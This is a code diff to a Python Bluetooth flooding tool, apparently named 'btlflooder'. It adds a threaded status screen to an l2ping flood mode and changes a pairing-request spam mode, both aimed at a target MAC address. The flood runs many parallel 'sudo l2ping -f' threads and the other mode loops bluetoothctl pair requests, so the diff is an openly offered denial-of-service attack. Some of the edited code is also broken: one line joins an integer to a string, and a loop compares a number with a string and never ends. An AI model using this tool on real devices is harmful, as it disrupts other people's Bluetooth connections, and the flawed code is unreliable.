@@ -43,17 +43,25 @@ else:
         for i in range(threadnums):
             threading.Thread(target = loopbacklrfcomm).start()
     elif (method == "l2ping"):
+        def outpp():
+            while True:
+                os.system("clear")
+                print("___.    __  .__      _____.__                    .___            \n\\_ |___/  |_|  |   _/ ____\\  |   ____   ____   __| _/___________ \n | __ \\   __\\  |   \\   __\\|  |  /  _ \\ /  _ \\ / __ |/ __ \\_  __ \\\n | \\_\\ \\  | |  |__  |  |  |  |_(  <_> |  <_> ) /_/ \\  ___/|  | \\/\n |___  /__| |____/  |__|  |____/\\____/ \\____/\\____ |\\___  >__|   \n     \\/                                           \\/    \\/       ")
+                print("senting packets to " + macadd)
+                print("running on " + threading.active_count()  + "/" + threadnum + " threads")
         def loopbacklping():
             while True: 
                 hwus = run_cmd("sudo l2ping -i %s -s %s -f %s &" % ("hci0", 600, macadd)) 
-                print("sent packet to " + macadd + " size:700")
+                
         print("running " + method + " attack on " + macadd + " with " + threadnum + " threads")
         for i in range(threadnums):
             threading.Thread(target = loopbacklping).start()
+
+        threading.Thread(target = outpp).start()
     elif (method == "pair"):
         def loopback():
             packetsent = 0
-            while True:
+            while packetsent != threadnum:
                 run_cmd("bluetoothctl power on") 
                 run_cmd("bluetoothctl discoverable on") 
                 run_cmd("bluetoothctl pairable on") 
@@ -63,8 +71,9 @@ else:
                 run_cmd("timeout 2s bluetoothctl pair " + macadd) 
                 packetsent += 1
                 os.system("clear")
+                print("___.    __  .__      _____.__                    .___            \n\\_ |___/  |_|  |   _/ ____\\  |   ____   ____   __| _/___________ \n | __ \\   __\\  |   \\   __\\|  |  /  _ \\ /  _ \\ / __ |/ __ \\_  __ \\\n | \\_\\ \\  | |  |__  |  |  |  |_(  <_> |  <_> ) /_/ \\  ___/|  | \\/\n |___  /__| |____/  |__|  |____/\\____/ \\____/\\____ |\\___  >__|   \n     \\/                                           \\/    \\/       ")
                 print("sent pair packet to " + macadd)
-                print("sent " + str(packetsent) + " packets")
+                print("sent " + str(packetsent) + " packets out of " + threadnum)
         print("running " + method + " attack on " + macadd)
         threading.Thread(target = loopback).start()
     else:
